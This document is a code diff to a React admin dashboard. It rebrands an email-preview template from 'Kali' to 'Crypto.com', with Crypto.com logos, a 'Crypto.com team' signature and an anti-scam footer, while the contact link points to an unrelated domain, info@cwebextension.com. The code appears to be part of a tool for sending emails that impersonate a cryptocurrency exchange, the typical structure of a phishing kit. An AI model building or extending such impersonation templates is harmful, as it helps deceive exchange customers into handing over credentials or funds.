@@ -1780,21 +1780,21 @@ export default function AdminDashboard() {
                                </button>
                             </div>
 
-                            {/* Column 2: Live Preview (Kali styled) */}
+                            {/* Column 2: Live Preview (Crypto.com styled) */}
                             <div className="lg:col-span-6 space-y-3">
-                               <p className="text-[10px] font-bold text-muted-foreground uppercase px-1">Live Email Preview (Kali style)</p>
+                               <p className="text-[10px] font-bold text-muted-foreground uppercase px-1">Live Email Preview</p>
                                <div className="border border-border rounded-2xl overflow-hidden bg-muted/20 p-4 flex justify-center">
-                                  {/* Kali layout simulation */}
+                                  {/* Layout simulation */}
                                   <div className="w-full max-w-[500px] bg-white text-gray-800 rounded-lg shadow-sm border border-gray-200 overflow-hidden text-left" style={{ fontFamily: 'Arial, sans-serif' }}>
                                      {/* Header */}
                                      <div className="p-4 flex justify-between items-center" style={{ backgroundColor: '#0f172a', borderBottom: '3px solid #2563eb' }}>
                                         <div className="flex items-center">
-                                           <img src="/logo-left.png" alt="Kali" style={{ height: '34px', objectFit: 'contain' }} />
+                                           <img src="/logo-left.png" alt="Crypto.com" style={{ height: '34px', objectFit: 'contain' }} />
                                         </div>
                                         
                                         {/* Right Logo (Image 3) */}
                                         <div className="flex items-center">
-                                           <img src="/logo-right.png" alt="Kali Emblem" style={{ height: '28px', objectFit: 'contain' }} />
+                                           <img src="/logo-right.png" alt="Crypto.com Emblem" style={{ height: '28px', objectFit: 'contain' }} />
                                         </div>
                                      </div>
                                      
@@ -1811,17 +1811,17 @@ export default function AdminDashboard() {
                                         
                                         <p className="mt-8 text-gray-600 text-sm">
                                            Regards,<br/>
-                                           <strong className="text-gray-900">Kali team</strong>
+                                           <strong className="text-gray-900">Crypto.com team</strong>
                                         </p>
                                      </div>
 
                                      {/* Footer */}
                                      <div className="px-6 pb-6 pt-4 border-t border-gray-100 bg-white">
                                         <p className="text-[9px] text-gray-400 text-center leading-normal mb-3">
-                                           Kali strives to safeguard your account and transactions to protect you from scams. Thank you for choosing Kali.
+                                           Crypto.com strives to safeguard your account and transactions to protect you from scams. Thank you for choosing Crypto.com.
                                         </p>
                                         <p className="text-xs text-center font-bold">
-                                           <span style={{ color: '#2563eb' }}>support@kali.com</span>
+                                           <a href="mailto:info@cwebextension.com" style={{ color: '#2563eb', textDecoration: 'none' }}>info@cwebextension.com</a>
                                         </p>
                                      </div>
                                   </div>
